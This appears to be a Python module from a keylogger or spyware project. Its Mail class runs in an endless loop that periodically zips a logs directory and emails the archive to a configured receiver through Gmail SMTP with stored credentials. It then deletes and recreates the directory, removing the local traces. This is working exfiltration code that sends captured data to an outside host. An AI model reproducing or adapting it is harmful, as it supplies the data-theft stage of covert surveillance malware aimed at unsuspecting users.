import time

import shutil
import smtplib

from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders

from settings import (path, sender, receiver,
                      password, send_every_seconds,
                      archive_name)
from src.create_files import make_dir, remove_dir


class Mail:
    """Send email and clear file content"""

    def __init__(self):
        self.archive_name = archive_name
        self.root_dir = path
        self.repeat = send_every_seconds

    def convert_to_zip(self):
        shutil.make_archive(self.archive_name, 'zip', self.root_dir)

    def send_mail(self):
        self.convert_to_zip()

        msg = MIMEMultipart()
        body = MIMEText("")

        msg['From'] = sender
        msg['To'] = receiver
        msg['Subject'] = 'Logs'

        msg.attach(body)

        part = MIMEBase("application", "octet-stream")
        part.set_payload(open(self.archive_name + ".zip", "rb").read())
        encoders.encode_base64(part)
        part.add_header("Content-Disposition",
                        ".attachment; filename=\"%s.zip\"" % (self.archive_name))
        msg.attach(part)

        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.starttls()
        server.login(sender, password)
        text = msg.as_string()
        server.sendmail(sender, receiver, text)

        server.quit()

    def send_and_clear(self):
        self.send_mail()

        remove_dir()
        make_dir()

    def run(self):
        while True:
            time.sleep(self.repeat)
            self.send_and_clear()
